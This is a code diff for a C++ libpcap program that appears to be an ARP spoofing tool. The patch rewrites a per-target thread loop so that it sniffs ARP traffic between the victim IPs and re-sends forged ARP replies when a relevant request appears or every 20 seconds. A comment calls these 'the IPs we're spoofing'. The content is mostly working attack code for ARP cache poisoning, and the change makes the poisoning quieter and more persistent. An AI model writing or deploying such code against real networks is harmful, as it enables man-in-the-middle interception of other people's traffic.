@@ -155,25 +155,55 @@ void send_arp_reply_loop(const char* dev, Mac my_mac, Ip target_ip, Mac sender_m
     printf("Thread for %s start!\n", std::string(target_ip).c_str());
     
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);  // 1000ms timeout
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return;
     }
 
-    time_t start_time = time(nullptr);
+    time_t last_arp_reply_time = time(nullptr);
+    const int arp_cache_timeout = 20; // Example: send ARP every 20 seconds if no requests seen
+
     while (true) {
-        // if (difftime(time(nullptr), start_time) > 5) {
-        //     send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
-        //     start_time = time(nullptr);
-        // }
+        struct pcap_pkthdr* header;
+        const u_char* packet_data;
 
-        send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
+        int res = pcap_next_ex(handle, &header, &packet_data);
+        if (res == 0) continue;  // Timeout elapsed
+        if (res == -1 || res == -2) break;  // Error or EOF
 
+        EthHdr* eth_hdr = (EthHdr*)packet_data;
+
+        // Check if the packet is an ARP packet
+        if (eth_hdr->type() == EthHdr::Arp) {
+            ArpHdr* arp_hdr = (ArpHdr*)(packet_data + sizeof(EthHdr));
+
+            // If it's an ARP request or response related to our target IP
+            if (arp_hdr->op() == ArpHdr::Request || arp_hdr->op() == ArpHdr::Reply) {
+                Ip arp_sender_ip = Ip(arp_hdr->sip());
+                Ip arp_target_ip = Ip(arp_hdr->tip());
+
+                // Check if this ARP is related to the IPs we're spoofing
+                if (arp_target_ip == target_ip && arp_sender_ip == sender_ip) {
+                    // Send ARP reply if we detect a relevant ARP request
+                    send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
+                    last_arp_reply_time = time(nullptr);
+                    printf("Sent ARP reply due to ARP request from %s\n", std::string(sender_ip).c_str());
+                }
+            }
+        }
+
+        // Periodically send ARP reply if no relevant ARP traffic has been seen
+        if (difftime(time(nullptr), last_arp_reply_time) > arp_cache_timeout) {
+            send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
+            last_arp_reply_time = time(nullptr);
+            printf("Sent periodic ARP reply to %s\n", std::string(sender_ip).c_str());
+        }
     }
 
     pcap_close(handle);
-
 }
+
 
 void print_packet_data(const u_char* data, int size) {
     for (int i = 0; i < size; i++) {
